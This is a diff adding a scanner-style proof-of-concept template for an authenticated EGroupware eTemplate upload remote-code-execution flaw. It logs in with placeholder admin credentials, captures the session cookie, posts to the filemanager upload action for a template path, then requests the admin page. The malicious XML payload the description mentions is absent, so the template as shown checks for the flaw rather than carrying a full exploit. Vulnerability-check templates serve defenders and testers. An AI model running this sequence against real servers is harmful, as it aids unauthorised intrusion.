@@ -1,0 +1,79 @@
+[info]
+id = "POC-AVE-2026-0036"
+name = "EGroupware eTemplate Upload RCE PoC"
+author = "AVE"
+severity = "high"
+tags = ["rce", "eval-injection"]
+description = "EGroupware 认证管理员通过上传恶意 eTemplate XML 文件实现远程命令执行。需要管理员权限且服务器未启用 disable_functions 限制。"
+vuln_id = ["CVE-2026-40187", "AVE-2026-0036"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/egroupware/login.php"
+
+headers.Content-Type = "application/x-www-form-urlencoded"
+headers.Cookie = ""
+
+body.type = "form"
+body.login = "{{admin_user}}"
+body.password = "{{admin_pass}}"
+body.domain = "default"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["menuaction"]
+expect = true
+
+[[poc.requests.extractors]]
+type = "regex"
+part = "header"
+name = "session_cookie"
+value = "sessionid=([a-zA-Z0-9]+)"
+group = 1
+
+[[poc.requests]]
+method = "POST"
+path = "/egroupware/index.php"
+
+headers.Content-Type = "application/x-www-form-urlencoded"
+headers.Cookie = "sessionid={{session_cookie}}"
+
+body.type = "form"
+body.menuaction = "filemanager.admin_ui.upload"
+body.app = "filemanager"
+body.name = "admin/templates/default/index.xet"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests]]
+method = "POST"
+path = "/egroupware/index.php"
+
+headers.Content-Type = "application/x-www-form-urlencoded"
+headers.Cookie = "sessionid={{session_cookie}}"
+
+body.type = "raw"
+body.content = "menuaction=admin.admin_ui.index"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["EGroupware"]
+expect = true
